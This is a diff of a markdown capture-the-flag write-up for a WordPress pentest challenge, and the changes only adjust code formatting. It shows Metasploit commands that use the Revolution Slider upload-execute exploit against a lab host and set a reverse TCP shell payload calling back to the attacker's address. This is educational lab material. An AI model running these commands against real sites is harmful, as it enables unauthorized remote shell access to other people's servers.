@@ -10,7 +10,7 @@ This challenge was in the “Network/Pentest” category. CTFs rarely offer pent
 </blockquote>
 
 The challenge provides an OpenVPN config file to use to access the challenge environment. The following command can be used to connect:
-openvpn wordpress.ovpn
+<code>openvpn wordpress.ovpn</code>
 
 **Discovery**
 
@@ -131,8 +131,11 @@ The Metasploit module listed by wpscan looked promising; to try using that to ex
 service postgresql start
 msfconsole
 msf > use exploit/unix/webapp/wp_revslider_upload_execute
+```
 
 After checking the module info to determine what options to set, I ran the following commands to attempt exploitation:
+
+```
 msf exploit(unix/webapp/wp_revslider_upload_execute) > set rhost 172.30.0.3
 msf exploit(unix/webapp/wp_revslider_upload_execute) > set payload generic/shell_reverse_tcp
 msf exploit(unix/webapp/wp_revslider_upload_execute) > set lhost 172.30.0.14
